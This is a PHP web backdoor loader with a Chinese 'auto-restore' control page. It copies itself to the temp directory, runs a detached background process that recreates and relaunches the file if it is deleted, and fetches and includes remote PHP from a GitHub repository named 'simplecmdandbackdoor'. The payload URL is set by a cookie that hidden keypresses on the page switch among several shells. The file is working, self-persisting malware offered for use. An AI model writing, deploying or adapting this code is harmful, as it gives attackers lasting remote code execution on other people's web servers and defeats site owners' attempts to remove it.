<?php
ignore_user_abort(true);
set_time_limit(0);

$文件路径 = __FILE__;
$进程名 = basename($文件路径);
$备份目录 = sys_get_temp_dir() . '/script_backup';
$备份文件 = $备份目录 . '/script.bak.php';
$锁定文件 = sys_get_temp_dir() . '/restore.lock';

if (!is_dir($备份目录)) {
    mkdir($备份目录, 0755, true);
}

if (!file_exists($备份文件)) {
    copy($文件路径, $备份文件);
}

function executeCommand($command) {
    $descriptorspec = [
        0 => ['pipe', 'r'],  // stdin
        1 => ['pipe', 'w'],  // stdout
        2 => ['pipe', 'w']   // stderr
    ];
    
    $process = proc_open($command, $descriptorspec, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['mode']) && $_POST['mode'] === 'on') {
        file_put_contents($锁定文件, 'on');

        executeCommand("pkill -f 'php $文件路径 background'");
        executeCommand("nohup php $文件路径 background > /dev/null 2>&1 &");
    } elseif (isset($_POST['mode']) && $_POST['mode'] === 'off') {
        executeCommand("pkill -f 'php $文件路径 background'");

        unlink($锁定文件);
        unlink($备份文件);
        rmdir($备份目录);
        unlink($文件路径);
        exit;
    }
}

if (isset($argv[1]) && $argv[1] === 'background') {
    while (file_exists($锁定文件)) {
        sleep(3);
        if (!file_exists($文件路径) && file_exists($备份文件)) {
            copy($备份文件, $文件路径);
            executeCommand("nohup php $文件路径 background > /dev/null 2>&1 &"); // 重新启动自己
            exit;
        }
    }
    exit;
}

function get_remote_content($remote_location) {
    if (function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $remote_location);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('file_get_contents')) {
        $response = @file_get_contents($remote_location);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($remote_location, "r");
        if ($handle) {
            $response = @stream_get_contents($handle);
            fclose($handle);
            if ($response !== false) {
                return $response;
            }
        }
    }

    return false;
}

$default_cache = "https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/ws.php";
$backnadya = isset($_GET['backnadya']);

if (!$backnadya) {
    if (!isset($_COOKIE['current_cache']) || empty($_COOKIE['current_cache'])) {
        setcookie('current_cache', urlencode($default_cache), time() + 3600, "/");
        $_COOKIE['current_cache'] = $default_cache;
    }

    $remote_location = urldecode($_COOKIE['current_cache']);

    $remote_location = filter_var($remote_location, FILTER_VALIDATE_URL);
    if ($remote_location === false) {
        die("Invalid URL.");
    }

    $parsed_url = parse_url($remote_location);
    if (!isset($parsed_url['scheme']) || !in_array($parsed_url['scheme'], ['https'])) {
        die("Only HTTPS protocol is allowed.");
    }

    $tmpfname = tempnam(sys_get_temp_dir(), '.trash.' . md5($remote_location . time()));
    if ($tmpfname === false) {
        die("Failed to create temporary file.");
    }

    $remote_content = get_remote_content($remote_location);
    if ($remote_content === false) {
        die("Failed to retrieve remote content.");
    }

    $handle = fopen($tmpfname, "w+");
    if ($handle === false) {
        unlink($tmpfname);
        die("Failed to open temporary file.");
    }
    fwrite($handle, $remote_content);
    fclose($handle);

    if (strpos(file_get_contents($tmpfname), '<?php') === false) {
        unlink($tmpfname);
        die("Invalid file content.");
    }

    include $tmpfname;
    unlink($tmpfname);
    exit;
}
?>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>自动恢复脚本</title>
    <style>
      body {
      font-family: Arial, sans-serif;
      padding: 1em;
      background-color: #f4f4f4;
      color: #000;
    }
    p {
      margin: 0.5em 0;
      font-size: 1rem;
    }
    .warning {
      color: #990000;
    }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; margin: 10px; }
        .on { background-color: green; color: white; }
        .off { background-color: red; color: white; }
    </style>
</head>
<body>
<center>
    <form method="post">
	 <p>当前 Cookie 值: <code><?php echo isset($_COOKIE['current_cache']) ? $_COOKIE['current_cache'] : '空'; ?></code></p>
    <p>自动恢复模式: <?= file_exists($锁定文件) ? '已开启 ✅' : '已关闭 ❌' ?></p>
        <button type="submit" name="mode" value="on" class="on">开启恢复模式</button>
        <button type="submit" name="mode" value="off" class="off">关闭恢复模式并删除文件</button>
    </form>
	</center>
  <script>
    function deleteCookie(name) {
      document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    }
    function setCookie(name, value, days) {
      let expires = "";
      if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
      }
      document.cookie = name + "=" + value + expires + "; path=/";
    }
    document.addEventListener("keydown", function(event) {
      deleteCookie("current_cache");
      if (event.key === "1") {
        setCookie("current_cache", encodeURIComponent("https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/jq.php"), 1);
      } else if (event.key === "2") {
        setCookie("current_cache", encodeURIComponent("https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/cnt.php"), 1);
      } else if (event.key === "3") {
        setCookie("current_cache", encodeURIComponent("https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/wss2.php"), 1);
      } else if (event.key.toUpperCase() === "0") { 
        setCookie("current_cache", encodeURIComponent("<?php echo $默认缓存地址; ?>"), 1);
      } else {
        return;
      }
      window.location.reload();
    });
  </script>
</body>
</html>